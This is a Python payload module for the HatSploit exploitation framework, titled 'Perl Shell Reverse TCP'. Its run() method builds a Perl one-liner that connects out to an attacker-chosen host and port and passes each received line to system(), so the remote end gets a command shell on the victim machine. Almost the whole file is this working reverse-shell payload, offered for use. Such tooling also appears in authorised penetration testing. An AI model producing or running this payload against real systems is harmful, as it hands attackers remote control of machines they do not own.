"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Perl Shell Reverse TCP",
            'Payload': "unix/generic/perl_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Perl shell reverse TCP payload.",
            'Architecture': "generic",
            'Platform': "unix",
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def run(self):
        remote_data = self.rhost.value + ':' + self.rport.value

        payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
        payload = payload.replace("LOCAL_DATA", remote_data)

        return payload
